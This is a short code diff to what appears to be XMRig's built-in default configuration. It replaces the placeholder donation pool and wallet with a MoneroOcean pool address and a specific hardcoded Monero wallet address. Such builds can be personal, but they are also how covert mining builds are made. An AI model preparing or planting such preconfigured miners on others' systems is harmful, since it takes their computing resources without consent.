@@ -92,8 +92,8 @@ R"===(
         {
             "algo": null,
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
+            "url": "gulf.moneroocean.stream:10128",
+            "user": "42PA86H9LFVbKc4ok6kHW7PUCfcJZ9ASPjAWFLEeB64DfuoacGcrpP2NVgVc7aDdawcotTW2n2nmJcWE1hsePtPk8VjsXV6",
             "pass": "x",
             "rig-id": null,
             "nicehash": false,
